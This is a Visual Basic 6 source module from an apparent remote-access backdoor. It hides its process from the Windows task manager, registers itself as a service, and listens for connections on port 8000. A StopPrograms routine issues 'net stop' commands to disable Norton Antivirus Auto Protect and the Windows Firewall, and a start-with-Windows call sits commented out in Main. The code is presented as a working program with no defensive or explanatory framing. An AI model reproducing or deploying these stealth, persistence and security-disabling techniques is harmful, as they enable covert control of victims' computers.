Attribute VB_Name = "modMain"
Option Explicit

'Copyright (C) 2004 Kristian. S.Stangeland

'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.

'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'GNU General Public License for more details.

'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software
'Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

Public Const Port = 8000 ' The port this program listen to
Public Const ChunckSize = 2048 ' The size of each chunck

Public Communication As New clsCommunication
Public TimerObject As New clsTimer
Public TimerEvent As Long
Public ExitApp As Boolean

Public Sub StopPrograms()

    ' Note that this will only work in XP/2000/NT or higher, and the user must have administrative privileges
    Shell "net stop Norton Antivirus Auto Protect Service"
    Shell "net stop Windows Firewall/Internet Connection Sharing (ICS)"

End Sub

Public Sub Main()

    ' Hide the program from the task manager
    If Communication.Main.IsWinNT = True Then
        App.TaskVisible = False
    Else
        MakeMeService
    End If

    ' Make the program start automatically at next restart
    ' Communication.Main.StartWithWindows

    ' Try to exit different programs
    ' StopPrograms

    ' Start the winsock
    Communication.StartServer
    
    ' No timer-event
    TimerEvent = -1
    
    ' Wait until the application is to be exited
    Do Until ExitApp
        
        If TimerEvent >= 0 Then
            TimerObject.FireTimer TimerEvent
            TimerEvent = -1
        End If
    
        DoEvents
        Sleep 1
    Loop

    Communication.StopServer
    Communication.Main.UnloadForms
    
    ' Undo service-operation
    If Communication.Main.IsWinNT = False Then
        UnMakeMeService
    End If

End Sub

Public Sub HexToArray(sHex As String, aResult() As Byte)

    Dim Tell As Long, Lenght As Long, Temp As Long
    
    ' Retrive the lenght of sHex
    Lenght = Len(sHex)
    
    ReDim aResult((Lenght / 2) - 1)
    
    For Tell = 1 To Lenght Step 2
    
        If Len(sHex) - Tell >= 1 Then
            aResult(Temp) = Val("&H" & Mid(sHex, Tell, 2))
            Temp = Temp + 1
        End If
    
    Next

End Sub

Public Sub TimerCallBack(ByVal lpParameter As Long, ByVal TimerOrWaitFired As Long)

    TimerEvent = lpParameter
    
End Sub

